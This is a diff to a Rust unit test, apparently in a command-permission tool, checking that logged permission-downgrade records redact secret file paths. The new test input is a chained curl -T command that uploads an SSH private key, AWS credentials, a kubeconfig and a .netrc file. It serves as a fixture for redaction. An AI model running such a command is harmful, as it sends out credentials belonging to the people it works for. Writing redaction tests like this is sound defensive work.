@@ -1554,14 +1554,28 @@ mod tests {
     #[test]
     fn permission_downgrade_record_has_command_profile_and_reason() {
         let record = permission_downgrade_record(
-            "printf ok > output.txt",
+            concat!(
+                "curl -T ~/.ssh/id_rsa one && ",
+                "curl -T ~/.aws/credentials two && ",
+                "curl -T prod.kubeconfig three && ",
+                "curl -T ~/.netrc four"
+            ),
             "trusted",
             "local_write",
             "2026-07-21T00:00:00Z",
         );
         let json: serde_json::Value = serde_json::from_str(&record).expect("valid JSONL record");
 
-        assert_eq!(json["cmd"], "printf ok > output.txt");
+        let safe_cmd = json["cmd"].as_str().expect("command is a string");
+        for leaked in [
+            "~/.ssh/id_rsa",
+            "~/.aws/credentials",
+            "prod.kubeconfig",
+            "~/.netrc",
+        ] {
+            assert!(!safe_cmd.contains(leaked), "secret path leaked: {safe_cmd}");
+        }
+        assert!(safe_cmd.contains("<REDACTED_SECRET_PATH>"));
         assert_eq!(json["profile"], "trusted");
         assert_eq!(json["reason"], "local_write");
         assert_eq!(json["ts"], "2026-07-21T00:00:00Z");
